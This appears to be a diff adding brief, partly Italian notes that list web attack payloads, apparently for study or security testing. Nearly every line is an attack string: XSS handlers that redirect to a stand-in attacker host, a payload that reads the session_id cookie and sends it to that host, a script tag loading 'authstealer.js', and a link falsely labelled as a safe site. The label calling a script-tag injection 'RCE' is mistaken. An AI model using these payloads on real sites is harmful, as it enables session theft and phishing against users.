@@ -1,0 +1,11 @@
+XSS
+Persistent XSS: <b onmouseover=window.location.replace("http://www.url.to.hacker.site")>Click me!</b>
+		<body onload=window.location.replace("http://www.url.to.hacker.site");>;
+		<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+DOM Based XSS: <b onmouseover=window.location.replace("http://www.url.to.hacker.site?cookie_stolen=".concat((await cookieStore.get("session_id")).value));>Click me!</b>
+
+RCE (ipotizzando db come MongoDB + Mongoose)
+Persistent XSS + RCE: Messaggio innocuo <script src="http://url.to.hacker.site/authstealer.js"> </script>
+
+Navigazione non sicura
+<a href="http://www.url.to.hacker.site">Sito web sicuro!</a>
